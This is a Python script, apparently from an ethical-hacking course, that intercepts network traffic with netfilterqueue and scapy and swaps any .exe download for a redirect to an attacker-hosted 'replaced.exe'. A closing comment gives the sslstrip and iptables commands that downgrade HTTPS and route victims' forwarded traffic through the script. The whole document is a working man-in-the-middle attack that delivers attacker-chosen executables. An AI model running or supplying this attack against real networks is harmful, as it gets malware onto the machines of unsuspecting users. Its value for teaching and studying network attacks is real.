# EXE Download Replacer

#!/use/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000:
            if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.13" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file...")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.13/replaced.exe\n")
                packet.set_payload(str(modified_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

'''
service apache2 start    # Starting webserver necessary.
sslstrip    # Keep it running. This and one below commmands enable this program to work with HTTPS.
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -I FORWARD -j NFQUEUE --queue-num 0    # FORWARD is name of chain that packets from other computers go through. Use INPUT and OUTPUT for your own computer.
iptables --flush    # After finishing this program, remove iptables.
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10276338?start=0 (Intercepting & Replacing Downloads on The Network)
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10255564?start=15 (Replacing Downloads on HTTPS Pages)
'''